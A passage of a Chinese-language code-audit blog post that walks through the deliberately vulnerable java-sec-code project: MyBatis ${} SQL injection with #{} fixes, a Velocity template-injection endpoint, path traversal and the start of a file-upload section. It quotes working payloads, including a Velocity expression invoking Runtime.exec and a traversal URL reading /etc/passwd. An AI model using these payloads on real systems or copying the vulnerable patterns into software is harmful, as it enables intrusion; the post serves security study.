by，凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等”，（在有些SQL语句中还是会必然使用到拼接的方式）</p><p>所以不可注入</p></li></ol><h3 id="jdbc-ps-vuln"><a href="#jdbc-ps-vuln" class="headerlink" title="jdbc_ps_vuln"></a>jdbc_ps_vuln</h3><p>也是使用预处理（同上）</p><h3 id="mybatisVuln01-02-03"><a href="#mybatisVuln01-02-03" class="headerlink" title="mybatisVuln01   02   03"></a>mybatisVuln01   02   03</h3><p>\src\main\java\org\joychou\controller\SQLI.java</p><ol><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/mybatis/sec01&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">User</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">mybatisSec01</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> username) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">userMapper</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">findByUserName</span><span style="color: #ABB2BF">(username);</span></span><span class="line"><span style="color: #E06C75">   }</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/mybatis/sec02&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">User</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">mybatisSec02</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;id&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">Integer</span><span style="color: #E06C75"> id) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">userMapper</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">findById</span><span style="color: #ABB2BF">(id);</span></span><span class="line"><span style="color: #E06C75">   }</span></span><span class="line"><span style="color: #E06C75"> </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/mybatis/sec03&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">User</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">mybatisSec03</span><span style="color: #E06C75">() {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">userMapper</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">OrderByUsername</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">   }</span></span></code></pre></div></div></figure></li><li><p>查看map类 </p><p>\src\main\resources\mapper\UserMapper.xml</p><p><strong>02</strong></p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;findByUserNameVuln02&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;String&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">resultMap</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">        select * from users where username like &#39;%${_parameter}%&#39;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">#使用like进行拼接sql语句${_parameter}是 MyBatis 的字符串替换，会直接将参数内容拼接到 SQL 中</span></span></code></pre></div></div></figure><p>解决：</p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;findByUserNameSafe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;String&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">resultMap</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    select * from users where username like concat(&#39;%&#39;,#{_parameter},&#39;%&#39;)</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">#使用concat(&#39;%&#39;,#{_parameter},&#39;%&#39;)的方式进行查询</span></span></code></pre></div></div></figure><p><strong>03</strong></p><figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">id</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;findByUserNameVuln03&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">parameterType</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;String&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">resultMap</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;User&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">        select * from users</span></span><span class="line"><span style="color: #ABB2BF">        &lt;</span><span style="color: #E06C75">if</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">test</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;order != null&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">            order by ${order} asc</span></span><span class="line"><span style="color: #ABB2BF">        &lt;/</span><span style="color: #E06C75">if</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">    &lt;/</span><span style="color: #E06C75">select</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">#${}使用的是拼接的方式导致的漏洞产生</span></span></code></pre></div></div></figure><p>解决：</p><p>如果是order by后的占位，则最好根据情况通过<code>if-elseif-else</code>来分情况实现。</p><p><code>mybatisOrderBySec04</code></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span></code></pre></div></div></figure><p><strong>01</strong></p><p>\target\classes\org\joychou\mapper\UserMapper.class</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">interface</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserMapper</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Select</span><span style="color: #E06C75">({</span><span style="color: #98C379">&quot;select * from users where username = #{username}&quot;</span><span style="color: #E06C75">})</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">User</span><span style="color: #61AFEF"> findByUserName</span><span style="color: #ABB2BF">(@</span><span style="color: #E5C07B">Param</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">var1</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Select</span><span style="color: #E06C75">({</span><span style="color: #98C379">&quot;select * from users where username = &#39;${username}&#39;&quot;</span><span style="color: #E06C75">})</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">List</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">User</span><span style="color: #ABB2BF">&gt;</span><span style="color: #61AFEF"> findByUserNameVuln01</span><span style="color: #ABB2BF">(@</span><span style="color: #E5C07B">Param</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;username&quot;</span><span style="color: #ABB2BF">) </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">var1</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">#${}使用的是拼接的方式导致的漏洞产生</span></span></code></pre></div></div></figure><p>解决：</p><p>正确的使用方法应该是使用<code>#</code>号来进行占位</p></li></ol><h3 id="mybatisOrderBySec04"><a href="#mybatisOrderBySec04" class="headerlink" title="mybatisOrderBySec04"></a>mybatisOrderBySec04</h3><ol><li><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/mybatis/orderby/sec04&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">User</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">mybatisOrderBySec04</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;sort&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sort) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">userMapper</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">findByUserNameVuln03</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">SecurityUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">sqlFilter</span><span style="color: #ABB2BF">(sort));</span><span style="color: #7F848E; font-style: italic">//存在过滤函数</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>追溯sqlFilter</p><p>\src\main\java\org\joychou\security\SecurityUtil.java</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * 过滤mybatis中order by不能用#的情况。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * 严格限制用户输入只能包含&lt;code&gt;a-zA-Z0-9_-.&lt;/code&gt;字符。</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    *</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">sql</span><span style="color: #7F848E; font-style: italic"> sql</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    * </span><span style="color: #C678DD; font-style: italic">@return</span><span style="color: #7F848E; font-style: italic"> 安全sql，否则返回null</span></span><span class="line"><span style="color: #7F848E; font-style: italic">    */</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">sqlFilter</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> sql) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">FILTER_PATTERN</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">matcher</span><span style="color: #ABB2BF">(sql).</span><span style="color: #61AFEF">matches</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">           </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       }</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> sql</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   }</span></span></code></pre></div></div></figure><p>FILTER_PATTERN：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Pattern</span><span style="color: #E06C75"> FILTER_PATTERN </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Pattern</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">compile</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;^[a-zA-Z0-9_/</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">.-]+$&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li><li><p>过滤mybatis中order by不能用#的情况。<br> 严格限制用户输入只能包含<code>a-zA-Z0-9_-.</code>字符</p><p>@param sql sql<br>@return 安全sql，否则返回null</p></li></ol><h2 id="SSTI服务器模板注入"><a href="#SSTI服务器模板注入" class="headerlink" title="SSTI服务器模板注入"></a>SSTI服务器模板注入</h2><p>\src\main\java\org\joychou\controller\SSTI.java</p><p>主要是使用<strong>Velocity组件</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75"> </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RestController</span></span><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/ssti&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">SSTI</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">    /**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * SSTI of Java velocity. The latest Velocity version still has this problem.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * Fix method: Avoid to use Velocity.evaluate method.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * &lt;p&gt;</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * Open a calculator in MacOS.</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     *</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * </span><span style="color: #C678DD; font-style: italic">@param</span><span style="color: #7F848E; font-style: italic"> </span><span style="color: #E06C75; font-style: italic">template</span><span style="color: #7F848E; font-style: italic"> exp</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     */</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/velocity&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> velocity</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">template</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Velocity</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">init</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">VelocityContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">context</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VelocityContext</span><span style="color: #ABB2BF">();</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;author&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;Elliot A.&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;address&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;217 E Broadway&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">context</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;phone&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;555-1337&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">StringWriter</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">swOut</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">StringWriter</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Velocity</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">evaluate</span><span style="color: #ABB2BF">(context, swOut, </span><span style="color: #98C379">&quot;test&quot;</span><span style="color: #ABB2BF">, template);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>主要是Velocity组件模板·存在漏洞</p><p>参考文章：<a href="https://xz.aliyun.com/news/14795">https://xz.aliyun.com/news/14795</a></p><h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><ol><li><p>\src\main\java\org\joychou\controller\PathTraversal.java</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">/**</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     * http://localhost:8080/path_traversal/vul?filepath=../../../../../etc/passwd</span></span><span class="line"><span style="color: #7F848E; font-style: italic">     */</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">GetMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/path_traversal/vul&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getImage</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> filepath) throws IOException {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getImgBase64</span><span style="color: #E06C75">(filepath)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>输入路径之后，<code>filepath</code> 参数直接传递给 <code>getImgBase64</code> 方法，未做任何验证，只存在一个basa64编码（getImgBase64）</p></li><li><p>追溯getImgBase64</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getImgBase64</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> imgFile) throws IOException {</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Working directory: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getProperty</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;user.dir&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">logger</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">info</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;File path: &quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> imgFile);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">File</span><span style="color: #E06C75"> f </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">File</span><span style="color: #E06C75">(imgFile)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">f</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">exists</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">f</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isDirectory</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] data </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Files</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readAllBytes</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Paths</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(imgFile));</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">String</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Base64</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">encodeBase64</span><span style="color: #ABB2BF">(data)</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;File doesn&#39;t exist or is not a file.&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>payload：<a href="http://localhost:9000/path_traversal/vul?filepath=d:/test.txt">http://localhost:9000/path_traversal/vul?filepath=d:/test.txt</a></p><p>读取D盘下的测试文件（发现可以成功读取内容）</p></li></ol><p><strong>解决：</strong>（过滤）</p><ol><li>使用白名单过滤、</li><li>使用 <code>Path</code> 和 <code>normalize()</code> 方法（根目录怕拼接）<ul><li>使用 <code>Path.resolve()</code> 而非字符串拼接。</li><li>使用 <code>normalize()</code> 方法规范化路径，防止 <code>../</code> 绕过。</li></ul></li></ol><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>\src\main\java\org\joychou\controller\FileUpload.java</p><ol><li><p>无过滤</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">PostMapping</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/upload&quot;</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">singleFileUpload</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;file&quot;</span><span style="color: #E06C75">) </span><span style="color: #E5C07B">MultipartFile</span><span style="color: #E06C75"> file</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">                                   </span><span style="color: #E5C07B">RedirectAttributes</span><span style="color: #E06C75"> redirectAttributes) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">file</span><span style="color: #ABB2BF">.</span><span style="color: 